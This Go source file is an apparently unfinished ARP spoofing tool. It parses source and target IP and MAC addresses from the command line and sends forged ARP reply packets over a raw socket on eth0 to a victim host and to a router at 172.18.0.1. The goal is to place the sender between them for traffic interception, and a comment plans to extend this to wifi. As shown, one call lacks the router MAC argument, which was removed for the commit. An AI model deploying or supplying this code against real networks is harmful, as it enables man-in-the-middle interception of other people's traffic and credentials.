package main

import (
	"log"
	"net"
	"syscall"
	"os"
	"fmt"
	"strings"
	"strconv"
)	

//in charge of getting the arguments and turning them into byte arrays
//need to do error hadling
func parse() [][]byte {
	args := os.Args
	if (len(args) != 5) {
		fmt.Println("Incorrect number of arguments, the structure must be: <IP-src><MAC-src><IP-target><MAC-target>, Ip format: x.x.x.x (decimal), Mac format: xx:xx:xx:xx:xx:xx (hex)")
		os.Exit(1)
	}
	bisliceS := make([][]string, 0, 4)
	for i, v := range(args[1:]) {
		if i % 2 == 0 {
			bisliceS = append(bisliceS, strings.Split(v, "."))
		} else {
			bisliceS = append(bisliceS, strings.Split(v, ":"))
		}
	}
	bisliceB := make([][]byte, 4, 4)
	var base int
	for i, v := range(bisliceS) {
		if i % 2 == 0 {
			base = 9
		} else {
			base = 15
		}
		base++
		for _, w := range(v) {
			introduce, err := strconv.ParseUint(w, base, 8)
			if err != nil {
				log.Fatal(err)
			}
			bisliceB[i] = append(bisliceB[i], byte(introduce))
		}
	}
	return bisliceB
}

func main() {
	var err error
	args := parse()
	fmt.Println(args)
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		log.Fatal(err)
	}
	interf, _ := net.InterfaceByName("eth0")
	addr := syscall.SockaddrLinklayer{
		Ifindex: interf.Index,
	}
	p := pkt_for_victim([]byte{172, 18, 0, 1}, args[1], args[2], args[3])
	err = syscall.Sendto(fd, p, 0, &addr)
	p = pkt_for_router(args[0], args[1], []byte{172, 18, 0, 1}, /*mac address of the router erased for commit*/)
	err = syscall.Sendto(fd, p, 0, &addr)
	if err != nil {
		log.Fatal("Sendto:", err)
	}
}

//make it available for wifi interception too
func pkt_for_victim(routerIp, sourceMac, targetIp, targetMac []byte) []byte {
	base_pack := []byte {
		0x08, //type (arp)
		0x06,
		0x00, //ethernet
		0x01,
		0x08, //IP type
		0x00,
		0x06, //mac len
		0x04, //IP len
		0x00, //operation(response)
		0x02,
	}
	pack := make([]byte, 0, 42)
	pack = append(pack, targetMac...)
	pack = append(pack, sourceMac...)
	pack = append(pack, base_pack...)
	pack = append(pack, sourceMac...)
	pack = append(pack, routerIp...)
	pack = append(pack, targetMac...)
	pack = append(pack, targetIp...)
	return pack
}

//maybe before send this to router we need to send ping packet so that router has our arp address in its table
func pkt_for_router(targetIp, sourceMac, routerIp, routerMac []byte) []byte {
	base_pack := []byte {
		0x08, //type (arp)
		0x06,
		0x00, //ethernet
		0x01,
		0x08, //IP type
		0x00,
		0x06, //mac len
		0x04, //IP len
		0x00, //operation(response)
		0x02,
	}
	pack := make([]byte, 0, 42)
	pack = append(pack, routerMac...)
	pack = append(pack, sourceMac...)
	pack = append(pack, base_pack...)
	pack = append(pack, sourceMac...)
	pack = append(pack, targetIp...)
	pack = append(pack, routerMac...)
	pack = append(pack, routerIp...)
	return pack
}
